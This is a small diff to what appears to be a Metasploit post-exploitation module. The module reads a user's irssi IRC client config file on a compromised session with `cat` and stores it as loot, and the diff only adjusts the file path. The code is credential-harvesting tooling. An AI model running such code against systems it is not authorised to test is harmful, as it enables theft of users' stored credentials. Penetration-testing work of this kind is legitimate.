@@ -71,7 +71,7 @@ class Metasploit3 < Msf::Post
   end
     
   def get_config(path)
-    path = "#{path}/.irssi/config"
+    path = "#{path}.irssi/config"
     print_status("#{@peer} - Downloading config")
     content = cmd_exec("cat #{path}")
     loot = store_loot('IRSSI_CONFIG', 'text/plain', session, content, "#{@peer}_config", "IRSSI Config file")
